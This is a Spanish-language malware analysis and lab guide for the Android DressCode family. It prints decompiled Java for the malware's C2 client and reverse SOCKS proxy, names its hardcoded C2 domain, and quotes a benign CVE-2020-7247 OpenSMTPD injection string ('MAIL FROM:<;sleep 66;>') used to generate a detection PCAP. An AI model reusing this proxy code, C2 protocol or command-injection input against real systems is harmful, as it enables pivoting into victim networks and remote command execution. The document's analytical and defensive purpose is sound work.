@@ -1,0 +1,270 @@
+DressCode es una familia de malware para Android que incorpora un proxy SOCKS de propósito general, descrito por Trend Micro en su [análisis sobre el impacto potencial de la familia en redes empresariales](https://web.archive.org/web/20211024123823/https://blog.trendmicro.com/trendlabs-security-intelligence/dresscode-potential-impact-enterprises/). La muestra analizada puede convertir el dispositivo infectado en un punto de paso entre el operador y servicios que sean accesibles desde la red de la víctima. Esta capacidad satisface [**T1604 - Proxy Through Victim**](https://attack.mitre.org/techniques/T1604/) y permite construir un flujo para **T1428 - Exploitation of Remote Services**, técnica que [MITRE ATT&CK atribuye expresamente a DressCode](https://attack.mitre.org/software/S0300/).
+
+El laboratorio seleccionado muestra ambas fases en una misma secuencia. Primero, el C2 ordena al dispositivo que abra una conexión de retorno hacia el operador. A continuación, el operador utiliza esa conexión como sesión SOCKS4 y solicita acceso a un servidor SMTP alcanzable desde la víctima. La sesión SMTP incluye una firma inocua de CVE-2020-7247; el servidor emulado la reconoce, pero no ejecuta ningún comando.
+
+### Análisis estático
+
+| Artefacto | Tipo | Identificación | SHA-256 |
+|---|---|---|---|
+| `DressCode-Reference.apk` | APK de Android con dos archivos DEX | Paquete `cache.system.cleaner`; versión 2.5; API objetivo 22 | `cce98e597f8c21c7ab87d5ecf82601153096614a7041bd9ccebc1104fcd08f87` |
+
+El manifiesto registra `com.zz.cc.Service` y el receptor `com.zz.cc.Receiver`; este último puede iniciar el servicio después de `BOOT_COMPLETED`. La actividad principal también contiene una ruta de arranque del mismo servicio. Una vez iniciado, `Service.onStartCommand()` crea una sola instancia de `Client`:
+
+```java
+public int onStartCommand(Intent intent, int flags, int startId) {
+    if (running.compareAndSet(false, true)) {
+        try {
+            new Client().start();
+        } catch (IOException ignored) {
+        }
+    }
+    return START_STICKY;
+}
+```
+
+El constructor de `Client` determina el primer extremo remoto. La muestra resuelve el dominio hardcodeado `dfm.nicsm.net`, elige de forma pseudoaleatoria una de las direcciones obtenidas y fija el puerto TCP/9001. Por tanto, una ejecución sin caché DNS debe producir primero la consulta del dominio y después una conexión hacia una de sus respuestas:
+
+```java
+public Client() {
+    try {
+        InetAddress[] addresses = InetAddress.getAllByName("dfm.nicsm.net");
+        Random random = new Random(System.nanoTime());
+        int index = (int) (random.nextDouble() * addresses.length);
+        setAddress(new InetSocketAddress(
+            addresses[index].getHostAddress(),
+            9001
+        ));
+    } catch (Throwable e) {
+        e.printStackTrace();
+    }
+}
+```
+
+La clase `ClientConnector` implementa la conexión mediante un `SocketChannel` no bloqueante. Si el enlace se pierde, vuelve a intentarlo con esperas que comienzan en 500 milisegundos y se duplican hasta un máximo de 30 segundos. Cuando se completa la conexión, `Client.onConnected()` envía inmediatamente `HELLO` seguido de `LF` (`0x0a`). No se aplica TLS ni otra capa de cifrado al canal C2.
+
+Los mensajes de aplicación son líneas de texto separadas por `LF`. El método `onRead()` reconoce cinco órdenes:
+
+```java
+protected void onRead(ByteBuffer buf) throws Exception {
+    String message = Charset.defaultCharset().decode(buf).toString();
+    String[] commands = message.split("\n");
+
+    for (String command : commands) {
+        if (command.equals("HELLO")) {
+            send(ByteBuffer.wrap("HELLO\n".getBytes()));
+        } else if (command.startsWith("PING")) {
+            send(ByteBuffer.wrap("PONG\n".getBytes()));
+        } else if (command.startsWith("SLEEP")) {
+            Thread.sleep(120000L);
+        } else if (command.startsWith("WAIT")) {
+            Thread.sleep(2000L);
+        } else if (command.startsWith("CREATE")) {
+            String[] args = command.split(",");
+            if (args.length == 3) {
+                createConnection(args[1], Integer.parseInt(args[2]));
+            }
+        }
+    }
+    buf.position(buf.limit());
+}
+```
+
+Las respuestas `HELLO` y `PONG` permiten confirmar el canal. Las órdenes `WAIT` y `SLEEP` bloquean el hilo durante 2 y 120 segundos, respectivamente, sin generar una respuesta. La operación que activa el proxy adopta esta forma:
+
+```text
+CREATE,<HOST_OPERADOR>,<PUERTO_OPERADOR>\n
+```
+
+El nombre o la dirección y el puerto del operador no están prefijados en el APK: llegan como argumentos del C2. La función `createConnection()` abre entonces una segunda conexión TCP saliente desde el dispositivo hacia ese extremo y entrega el socket a `ProxyHandler`:
+
+```java
+private void createConnection(String server, int port) throws IOException {
+    ProxyHandler proxy = new ProxyHandler(new Socket(server, port));
+    proxy.start();
+}
+```
+
+Esta dirección de la conexión es relevante. DressCode no abre un puerto de escucha SOCKS en el dispositivo: es la víctima quien se conecta al operador. Una vez establecido el enlace, el operador actúa como cliente SOCKS y el objeto `ProxyHandler` de la víctima interpreta sus mensajes como servidor proxy.
+
+El primer octeto recibido selecciona SOCKS4 (`0x04`) o SOCKS5 (`0x05`). Después de procesar la autenticación y la petición, `ProxyHandler` ejecuta `CONNECT`, `BIND` o `UDP ASSOCIATE` según la versión y el comando solicitados:
+
+```java
+public void processRelay() {
+    try {
+        byte version = getByteFromClient();
+        switch (version) {
+            case 4:
+                comm = new Socks4Impl(this);
+                break;
+            case 5:
+                comm = new Socks5Impl(this);
+                break;
+            default:
+                return;
+        }
+
+        comm.authenticate(version);
+        comm.getClientCommand();
+
+        switch (comm.socksCommand) {
+            case 1:
+                comm.connect();
+                relay();
+                break;
+            case 2:
+                comm.bind();
+                relay();
+                break;
+            case 3:
+                comm.udp();
+                break;
+        }
+    } catch (Exception ignored) {
+    }
+}
+```
+
+En SOCKS4 no existe una negociación de autenticación separada. `Socks4Impl.getClientCommand()` lee el comando, el puerto de destino en orden de red, cuatro octetos de dirección IPv4 y un identificador de usuario terminado en `NUL`. La implementación admite `CONNECT` y `BIND`:
+
+```java
+public void getClientCommand() throws Exception {
+    socksCommand = getByte();
+    DST_Port[0] = getByte();
+    DST_Port[1] = getByte();
+
+    for (int i = 0; i < 4; i++) {
+        DST_Addr[i] = getByte();
+    }
+
+    while (true) {
+        byte value = getByte();
+        if (value == 0) {
+            break;
+        }
+        UID += (char) value;
+    }
+
+    if (socksCommand < 1 || socksCommand > 2) {
+        refuseCommand((byte) 91);
+        throw new Exception();
+    }
+    if (!calculateAddress()) {
+        refuseCommand((byte) 92);
+        throw new Exception();
+    }
+}
+```
+
+Para `CONNECT`, la víctima abre un tercer socket TCP hacia la dirección y el puerto solicitados. Si la conexión tiene éxito, responde al operador con el código decimal 90 (`0x5a`); en caso contrario utiliza 91 (`0x5b`). A partir de ese momento, `relay()` copia bloques de hasta 4096 bytes en ambos sentidos entre el socket del operador y el socket del servicio remoto. El malware no interpreta SMTP, HTTP ni el protocolo que viaje dentro del túnel.
+
+SOCKS5 introduce una negociación previa. El operador envía la versión, el número de métodos y la lista de métodos admitidos. La muestra solo acepta que esa lista contenga `0x00`, correspondiente a «Sin autenticación», y responde `05 00`. No implementa la autenticación con usuario y contraseña:
+
+```java
+public boolean checkAuthentication() throws Exception {
+    byte methodsCount = getByte();
+    String methods = "";
+    for (int i = 0; i < methodsCount; i++) {
+        methods += ",-" + ((int) getByte()) + '-';
+    }
+    return methods.indexOf("-0-") != -1
+        || methods.indexOf("-00-") != -1;
+}
+```
+
+Tras esa respuesta se transmite la petición SOCKS5 propiamente dicha. La muestra reconoce direcciones IPv4 (`ATYP=0x01`) y nombres de dominio (`ATYP=0x03`), pero rechaza IPv6 (`ATYP=0x04`). `CONNECT`, `BIND` y `UDP ASSOCIATE` son accesibles en esta variante, aunque el laboratorio utiliza exclusivamente SOCKS4 con `CONNECT`.
+
+### Secuencia comunicativa
+
+El flujo seleccionado contiene cuatro relaciones de red consecutivas:
+
+1. El dispositivo resuelve `dfm.nicsm.net` y abre el canal C2 mediante TCP/9001.
+2. El C2 intercambia líneas `HELLO`, `PING` y `PONG`, y envía `CREATE,<HOST>,<PUERTO>`.
+3. La víctima abre una conexión TCP hacia el extremo indicado en `CREATE`; sobre ella, el operador envía la negociación SOCKS.
+4. Ante una petición `CONNECT`, la víctima crea otra conexión hacia el servicio remoto y retransmite los datos de aplicación en ambos sentidos.
+
+La petición SOCKS4 tiene la siguiente estructura:
+
+```text
++-----+-----+----------+----------+----------------+------+
+| VER | CMD | DST.PORT |  DST.IP  |     USERID     | NUL  |
++-----+-----+----------+----------+----------------+------+
+|  1  |  1  |    2     |    4     | longitud var.  |  1   |
++-----+-----+----------+----------+----------------+------+
+```
+
+Para el escenario elegido, `VER=0x04`, `CMD=0x01` (`CONNECT`), `DST.PORT=0x0019` (TCP/25), `DST.IP` contiene la dirección IPv4 del SMTP emulado y `USERID` está vacío. La respuesta de ocho octetos comienza por `00 5a` cuando se concede la conexión.
+
+En SOCKS5 la negociación y la petición no forman una sola estructura, sino dos intercambios:
+
+```text
+Operador hacia víctima: VER NMETHODS METHODS
+Víctima hacia operador: VER METHOD
+
+Operador hacia víctima: VER CMD RSV ATYP DST.ADDR DST.PORT
+Víctima hacia operador: VER REP RSV ATYP BND.ADDR BND.PORT
+```
+
+Los valores de `CMD` definidos por [RFC 1928](https://www.rfc-editor.org/rfc/rfc1928) son `0x01` para `CONNECT`, `0x02` para `BIND` y `0x03` para `UDP ASSOCIATE`. `RSV` ocupa un octeto y debe valer `0x00`. La dirección es IPv4 para `ATYP=0x01`, un nombre precedido por su longitud para `ATYP=0x03` o IPv6 para `ATYP=0x04`, aunque esta última posibilidad es rechazada por DressCode.
+
+El puerto TCP/9001 y el dominio `dfm.nicsm.net` proceden del APK. En cambio, el puerto de la sesión SOCKS es controlado por el C2 mediante `CREATE`. El laboratorio selecciona TCP/9002, distinto del puerto 1080 registrado para SOCKS, con el fin de representar [**T1509 - Non-Standard Port**](https://attack.mitre.org/techniques/T1509/). TCP/9002 no debe presentarse como un indicador histórico de DressCode: es un valor permitido por el código y elegido para esta captura.
+
+La capacidad de crear el tercer socket y retransmitir bytes demuestra **T1604 - Proxy Through Victim**. DressCode no contiene ningún exploit contra SMTP ni contra otro servicio; **T1428 - Exploitation of Remote Services** se materializa en el laboratorio cuando el operador utiliza el túnel para alcanzar el servidor vulnerable emulado. La atribución de la explotación depende, por tanto, de la conversación transportada y no de una orden específica del C2 de DressCode.
+
+```mermaid
+sequenceDiagram
+    participant V as "Android con DressCode"
+    participant DNS as "Servidor DNS"
+    participant C2 as "C2 emulado"
+    participant O as "Operador y cliente SOCKS4"
+    participant S as "Servidor SMTP emulado"
+
+    V->>DNS: A dfm.nicsm.net
+    DNS-->>V: 10.0.2.2 (valor del laboratorio)
+    V->>C2: TCP/9001
+    V->>C2: HELLO + LF
+    C2-->>V: HELLO + LF
+    V->>C2: HELLO + LF
+    C2-->>V: PING + LF
+    V->>C2: PONG + LF
+    C2-->>V: CREATE,10.0.2.2,9002 + LF
+    V->>O: Nueva conexión TCP/9002
+    O->>V: SOCKS4 CONNECT 10.0.2.2:25
+    V->>S: Nueva conexión TCP/25
+    V-->>O: SOCKS4 00 5a (petición concedida)
+    S-->>V: Banner SMTP
+    V-->>O: Banner SMTP retransmitido
+    O->>V: EHLO y MAIL FROM con firma CVE-2020-7247
+    V->>S: Primitivas SMTP retransmitidas
+    S-->>V: Respuestas SMTP
+    V-->>O: Respuestas SMTP retransmitidas
+```
+
+### Laboratorio de generación del PCAP
+
+El APK declara `targetSdkVersion=22`. El laboratorio ejecuta la muestra original en Android y emula mediante Python los tres participantes externos: el C2, el cliente SOCKS del operador y el servidor SMTP. CoreDNS resuelve el dominio hardcodeado hacia `10.0.2.2`, dirección especial mediante la que el emulador Android alcanza el host del laboratorio.
+
+El escenario utiliza SOCKS4 para mantener visible una negociación breve y suficiente. El C2 envía `CREATE,10.0.2.2,9002`; la muestra se conecta al cliente SOCKS que escucha en TCP/9002 y este solicita `CONNECT 10.0.2.2:25`. Tras recibir la concesión del proxy, el cliente completa una conversación SMTP a través de la víctima.
+
+El servicio remoto representa OpenSMTPD afectado por [CVE-2020-7247](https://nvd.nist.gov/vuln/detail/CVE-2020-7247). El fallo permitía que determinados metacaracteres de shell alcanzaran el tratamiento de `MAIL FROM`; el ejemplo inocuo publicado por Qualys utiliza `MAIL FROM:<;sleep 66;>`, tal como recoge el [advisory de oss-security](https://www.openwall.com/lists/oss-security/2020/01/28/3). El emulador se limita a reconocer esa cadena y devolver respuestas SMTP: no ejecuta `sleep` ni ningún otro comando.
+
+CVE-2020-7247 es posterior a la aparición de DressCode y no forma parte de su implementación. Su uso constituye una decisión controlada para producir una firma de explotación inequívoca dentro del tráfico retransmitido. De igual forma, `10.0.2.2`, TCP/9002 y el servidor SMTP son elementos del laboratorio; `dfm.nicsm.net`, TCP/9001, el protocolo de líneas del C2 y la implementación SOCKS proceden del APK.
+
+Desde la raíz del directorio de DressCode, los servicios se inician en cuatro terminales y en este orden:
+
+```powershell
+PS> coredns.exe -conf .\DNS\Corefile
+```
+
+```powershell
+PS> python .\Servidor_SMTP\smtp_emulator.py --bind 0.0.0.0 --port 25
+```
+
+```powershell
+PS> python .\Cliente_Proxy\attacker_socks4_client.py --bind 0.0.0.0 --port 9002 --target-ip 10.0.2.2 --target-port 25
+```
+
+```powershell
+PS> python .\C2\c2_emulator.py --bind 0.0.0.0 --port 9001 --attacker-host 10.0.2.2 --attacker-port 9002
+```
+
+Una vez disponibles los servicios, se inicia la aplicación en Android. La captura debe mostrar la consulta de `dfm.nicsm.net`, el canal C2 sobre TCP/9001, la conexión inversa hacia TCP/9002, la petición SOCKS4 y una conexión distinta desde el dispositivo hacia TCP/25. Las primitivas SMTP deben aparecer tanto en el tramo operador-víctima como en el tramo víctima-servidor, lo que permite demostrar que la segunda conexión nace de `CONNECT` y que sus datos regresan por el mismo túnel.
